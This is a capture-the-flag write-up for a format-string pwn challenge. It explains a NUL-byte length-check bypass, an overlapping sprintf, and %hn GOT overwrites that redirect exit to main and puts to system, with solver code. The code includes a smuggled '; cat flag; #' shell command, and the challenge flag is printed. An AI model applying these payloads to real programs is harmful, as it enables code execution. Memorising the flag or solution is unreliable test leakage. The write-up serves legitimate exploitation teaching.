---
title: "Short Fuse"
area: format-strings
role: author
event: friendly-2026
published: 2026-09-29
summary: "A length check and a self-overlapping sprintf hide a %hn write that loops exit into main and pivots puts into system."
techniques: ["format string", "GOT overwrite", "%hn write", "PLT/GOT pivot"]
difficulty: hard
arch: amd64
flag: "Securinets{f1v3_ch4rs_w4s_4ll_1t_t00k}"
---

> Category: **pwn** — Tag: **format-string**
> Flag: `Securinets{f1v3_ch4rs_w4s_4ll_1t_t00k}`

This one is the star of the folder: it has **two** solver files, `sovlertaz.py`
(the author's first rough notes/idea) and `solver.py` (the final, working,
heavily-commented exploit). This writeup builds the whole story from both.

---

## 1. What the program does

```c
void setup(){
    setbuf(stdout,0); setbuf(stdin,0); setbuf(stderr,0);
    open("flag", O_RDONLY);   // <-- opens the flag but NEVER reads it into memory!
}

void vuln(){
    char buf[0x200];
    puts("Let's see the diff between printf and puts");
    read(0, buf, sizeof(buf)-1);
    if (strlen(buf) > 5) exit(0);              // "short fuse": 5 chars max
    sprintf(buf, "Your text : %s ", buf);       // buf is both src AND dst!
    printf(buf);                                // <-- format string bug
    puts(buf);
    return;
}
```

Two things jump out immediately:

1. **`setup()` opens `"flag"` but never reads its contents into a buffer.**
   That means we can't just overflow a stack buffer to leak flag bytes that
   are already sitting in memory — the flag simply isn't loaded yet. We will
   need actual **code execution** (a shell) to `cat` the flag ourselves.
2. **`printf(buf)`** — the first argument of `printf` is supposed to be a
   fixed format string like `printf("%d\n", x)`. Here the *user's own input*
   becomes the format string. This is a classic **format string
   vulnerability**: if our input contains `%x`, `%p`, `%s`, `%n`, etc.,
   `printf` will happily read/write memory it shouldn't, because it thinks
   those specifiers came from trusted arguments.

Checking the binary's protections (`pwn checksec` on `main`):

```
RELRO:      Partial RELRO   -> the GOT (Global Offset Table) is writable!
Stack:      Canary found    -> can't just smash the return address
NX:         NX enabled      -> can't jump to shellcode on the stack
PIE:        No PIE (0x3fe000)
```

"Partial RELRO" is the key detail: it means the GOT — the table the program
uses to find real addresses of library functions like `puts`, `exit`,
`printf` — can be **overwritten at runtime**. A format string bug + a
writable GOT is a very strong combo: we can redirect any GOT entry to any
address we want.

---

## 2. Trick #1 — sneaking past the "5 characters" gate

```c
read(0, buf, sizeof(buf)-1);      // we CAN send up to 0x1ff bytes...
if (strlen(buf) > 5) exit(0);     // ...but only the first 5 "count"!
```

`read()` will happily store however many bytes we send (up to `0x1ff`).
The check right after uses `strlen()`, though — and `strlen()` stops
counting at the **first NUL byte (`\x00`)**, not at the actual number of
bytes we sent.

So the trick is: **send a leading `\x00` byte.** `strlen(buf)` becomes `0`,
which is `<= 5`, so the gate is bypassed — even though the rest of `buf`
(all the way up to byte 511) is packed with our real payload.

`sovlertaz.py`'s very first line already shows this idea being tested:

```python
p.sendline(b"\x00abcdefghijklmnop")
```

A NUL, then whatever we want. That one line is the seed of the whole
exploit.

## 3. Trick #2 — the self-overlapping `sprintf`

```c
sprintf(buf, "Your text : %s ", buf);
```

This line reads `buf` (the `%s`) **while also writing into `buf`** (the
destination). `sprintf` writes left to right, so it first stomps the first
12 bytes of `buf` with the literal text `"Your text : "`, **destroying
whatever we originally put there** — and *then* the `%s` copies in
`"Your text : "` immediately followed by our own data starting at
`buf[12]`. The end result sitting in `buf` right before `printf(buf)` runs
is:

```
"Your text : Your text : " + <our payload, starting at buf[12]> + " "
```

Both `sovlertaz.py`'s comment and `solver.py`'s header nail this exactly:

```
# sprintf overwrites the first 12 bytes so we should put \x00 in the
# first 5 bytes to bypass strlen then to 12 bytes to skip
# "your text: " of sprintf
```

```
# Trick 2 -- the doubling:
#   sprintf(buf, "Your text : %s ", buf) overlaps src/dst. It first writes
#   the 12-byte prefix over buf[0..11] (destroying anything there), then the
#   %s copies "Your text : " + buf[12..NUL].  So printf() finally sees:
#       "Your text : Your text : " + <our data at buf[12..]> + " "
#   => a *full length* format string (specifiers must live at buf[12+]).
```

**Takeaway:** put the single `\x00` at `buf[0]` (bypasses the length
check), but put the *actual* format-string directives starting at `buf[12]`
(so they survive the `sprintf` prefix stomp).

## 4. The plan: overwrite the GOT to pop a shell

Both solvers agree on the same high-level idea, which `sovlertaz.py`'s
comment states in plain English:

```
the main idea is to overwrite puts got entry so call system("/bin/sh")
...
then overwrite got entry using format string, u need fist to leak libc,
we can overwrite got entry of exit() with main() so we get infinity
of overwrites.
we can run system("your text : || /bin/sh\x00") to bypass "your text :" error.
```

Turning that idea into a working exploit needs a few standard format-string
building blocks (explained for beginners):

- **`%p` / positional `%N$p`** — leaks the value of the Nth argument
  `printf` thinks it was given. Since `printf(buf)` was called with *no*
  real extra arguments, printf just keeps reading whatever garbage/stack
  data comes next — including, further along, **`buf` itself** (because at
  the point `printf` runs, `buf` sits right at the top of the stack, so its
  own bytes double as fake arguments). This is what `solver.py` calls out
  explicitly:
  ```
  # Arg mapping (rsp == buf at printf): buf[8*(N-6)] == positional arg %N.
  ```
  In other words: whatever 8-byte value we place at `buf[8*(N-6)]` becomes
  readable/writable as `%N$...`.
- **`%hn` / `%N$hn`** — instead of *reading* a value, this *writes* the
  number of characters `printf` has output **so far** as a 2-byte (`h`)
  write to the address given by argument N. Combined with padding
  specifiers like `%50c` (print 50 filler characters), we can control
  *exactly* what 16-bit value gets written, and *where* (by staging a
  pointer at the right `buf[8*(N-6)]` slot). Writing an address 2 bytes at
  a time, several times, is the standard way to forge an arbitrary 8-byte
  write out of a format string bug.
- **One connection = one ASLR.** Since libc's base address is randomized
  per-process (ASLR), and the whole `main()`/`vuln()` flow normally runs
  **once** then calls `exit(0)`, we'd only get *one* format-string shot —
  not enough to both leak libc *and* redirect execution. The fix, again
  straight from the author's notes: **overwrite `exit`'s GOT entry to
  point at `main` instead.** Then every time the program would have exited,
  it silently restarts `main()` (same process, same ASLR, same libc base)
  and lets us send another payload. That gives us as many format-string
  "turns" as we want against one live process.

## 5. Walking through the final `solver.py`

```python
LEAK_OFF = 0x276c1         # libc offset whose value the leaked pointer minus libc base equals
SYS_OFF  = libc.symbols['system']
EXIT_GOT = 0x404040
PUTS_GOT = 0x404000
MAIN     = 0x4012c2
```
These are fixed, non-PIE addresses (remember: `No PIE`), found by inspecting
the binary in GDB — the GOT entries for `exit`/`puts`, and `main`'s address.
`LEAK_OFF` is the offset (found empirically, by leaking a pointer and
subtracting the known libc base while testing locally) that lets us turn a
leaked stack value straight into libc's base address.

**`build()`** assembles a payload following Trick 1 + Trick 2:
```python
sent = bytearray(b'\x00' + b'B'*11 + directives + b'\x00')  # NUL, junk to reach buf[12], our directives
sent += b'C' * (off - len(sent))                            # padding out to offset 0x100
for a in addrs:
    sent += p64(a)                                          # target addresses, parked past the padding
```
The target addresses are placed **after** the format directives' own
terminating NUL, so the earlier `%s` copy inside `sprintf` (which stops at
a NUL) never touches or truncates them — they just sit in `buf` ready to be
referenced as high-numbered `%N$` arguments.

**`hn_writes()`** builds a chain of `%<pad>c%<N>$hn` writes, always sorted
so the padding count only ever grows (printf can't "print negative
characters" to go backwards, so writes must be ordered ascending):
```python
d = (val - cur) % 0x10000
out += b'%' + str(d).encode() + b'c'
out += b'%' + str(arg).encode() + b'$hn'
```

**Iteration 1 — leak libc + make `exit` loop back to `main`:**
```python
d1 = b'%' + str(0x12c2 - 24).encode() + b'c' + b'%38$hn' + b'%75$p'
p.send(build(d1, [EXIT_GOT]))
```
This writes the low 16 bits of `main`'s address into `exit@got` (a partial
GOT overwrite is enough since `main` and the current `exit` address share
the same upper bits on a non-PIE binary), and in the same payload leaks a
libc pointer via `%75$p`. From that leak, the script computes:
```python
libc.address = leak - LEAK_OFF
system = libc.address + SYS_OFF
```

**Iteration 2 — turn `puts@got` into `system`, then smuggle a shell command:**
```python
writes = [(ARG0 + i, (system >> (16*i)) & 0xffff) for i in range(3)]
d2 = hn_writes(writes) + b'; cat flag; #'
p.send(build(d2, [PUTS_GOT, PUTS_GOT + 2, PUTS_GOT + 4]))
```
Three 16-bit writes rebuild `system`'s full address inside `puts@got`
(covering the low 48 bits is enough — the top 16 bits of a libc address are
always `0`). Immediately after `printf(buf)` returns, the code calls
`puts(buf)` — except `puts@got` now actually points at `system`! So this
call silently becomes:
```c
system(buf);   // buf == "Your text : Your text : ...; cat flag; #"
```
The leading junk (`Your text : ...`) just fails as an invalid shell
command, the `;` starts a fresh one, `cat flag` prints the flag, and the
trailing `#` comments out anything left over. This is exactly the
`"your text : || /bin/sh"`-style trick `sovlertaz.py`'s notes predicted,
just implemented with `;` instead of `||` and `cat flag` instead of a
shell.

Finally:
```python
data = p.recvall(timeout=8)
m = re.search(rb'Securinets\{[^}]*\}', data)
```
grabs the flag straight out of the output.

## 6. From notes to working exploit

It's worth appreciating `sovlertaz.py` for what it actually is: **the
author's own honest scratch notes**, written *before* solving the
challenge for real —

```
tbh i forgot to solve this chall xD
...
this is all theorically i didn't try it but it should be fine
i also generated solver using ai i hope it's helpful.
```

That's a completely normal (and very common!) part of CTF pwn work: you
often understand *the idea* of an exploit (bypass the length check, abuse
the overlapping `sprintf`, leak libc, loop via `exit@got → main`, pivot
`puts@got → system`) well before you have a fully working script. Writing
the idea down first — even messily — is what made turning it into the
polished, commented `solver.py` possible.

## 7. Running it

```bash
python3 solver.py r                                 # remote, default host/port
python3 solver.py r <host> <port>                    # remote, custom host/port
python3 solver.py                                    # local process
```

Output ends with:
```
[+] FLAG: Securinets{f1v3_ch4rs_w4s_4ll_1t_t00k}
```
